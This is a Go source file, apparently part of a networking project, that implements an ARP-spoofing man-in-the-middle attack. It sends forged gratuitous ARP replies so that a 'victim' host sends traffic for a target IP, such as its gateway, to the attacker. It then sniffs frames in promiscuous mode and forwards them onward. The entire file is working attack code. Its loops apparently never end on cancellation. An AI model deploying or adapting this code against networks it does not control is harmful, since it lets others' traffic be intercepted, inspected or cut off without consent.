package mitm

import (
	"context"
	"fmt"
	"net"
	"time"

	"github.com/jhead/phantom/internal/switch/netutils"
	"github.com/mdlayher/arp"
	"github.com/mdlayher/ethernet"
	"github.com/mdlayher/raw"
)

const arpInterval = 1000

// SpoofARP sends gratuitous ARP replies to the victim's MAC address containing the IP of a target that we want to
// place ourselves in the middle of. These ARP replies instruct the victim to send its traffic destined for that IP
// to us instead, which can then be inspected and/or forwarded using packet capture.
//
// Note that unless your system is configured to forward the packets addressed to the original IP, the victim will
// most likely lose connectivity to the target; if your target is the default gateway, it will lose Internet access.
func SpoofARP(ctx context.Context, source netutils.Interface, victimAddr net.HardwareAddr, destination net.IP) error {
	arpClient, err := arp.Dial(&source.Interface)
	if err != nil {
		return err
	}

	// (op Operation, srcHW net.HardwareAddr, srcIP net.IP, dstHW net.HardwareAddr, dstIP net.IP)
	packet, err := arp.NewPacket(
		// Gratuitous ARP reply
		arp.OperationReply,
		// From this device
		source.Interface.HardwareAddr,
		// Masquerade as the IP that the victim is looking for
		destination,
		// It's us, we're the one you're looking for! I promise!
		source.Interface.HardwareAddr,
		destination,
	)

	if err != nil {
		return err
	}

	// Loop until cancelled
	for ctx.Done() != nil {
		arpClient.WriteTo(packet, victimAddr)
		time.Sleep(arpInterval * time.Millisecond)
	}

	return nil
}

type Packet struct {
	Buffer []byte
	Addr   net.Addr
}

type PacketFilter func(packetbuffer []byte) bool

const defaultMTU = 1500

func Sniff(
	ctx context.Context,
	etherClient *raw.Conn,
	filters []PacketFilter,
	recvPackets chan Packet,
) error {
	// Set to promiscuous mode so that we can recieve packets destined for other IPs
	if err := etherClient.SetPromiscuous(true); err != nil {
		return err
	}

	bigBuffer := make([]byte, defaultMTU)

	// Loop until cancelled
	for ctx.Done() != nil {
		read, fromAddr, err := etherClient.ReadFrom(bigBuffer)
		if err != nil {
			// todo: handle
			continue
		}

		packetBytes := bigBuffer[:read]

		if !packetFiltersMatch(packetBytes, filters) {
			continue
		}

		recvPackets <- Packet{
			packetBytes,
			fromAddr,
		}
	}

	return nil
}

func packetFiltersMatch(packetBytes []byte, filters []PacketFilter) bool {
	// Iterate over filters to avoid processing irrelevant data
	for _, filter := range filters {
		// Skip on first filter that returns false
		if !filter(packetBytes) {
			return false
		}
	}
	return true
}

func ForwardAll(
	ctx context.Context,
	etherClient *raw.Conn,
	recvPackets chan Packet,
	iface net.Interface,
	forwardTo net.HardwareAddr,
) error {
	for ctx.Done() != nil {
		packet := <-recvPackets

		// Decode the incoming ethernet frame
		frame := ethernet.Frame{}
		err := frame.UnmarshalBinary(packet.Buffer)
		if err != nil {
			return err
		}

		// Rewrite addresses to forward the frame
		frame.Source = iface.HardwareAddr
		frame.Destination = forwardTo

		// Build the new frame bytes
		newFrameBuffer, err := frame.MarshalBinary()
		if err != nil {
			return err
		}

		fmt.Printf("Forwarding %d bytes to gateway\n", len(newFrameBuffer))

		// Write the modified frame to the interface
		if _, err := etherClient.WriteTo(newFrameBuffer, nil); err != nil {
			return err
		}
	}

	return nil
}
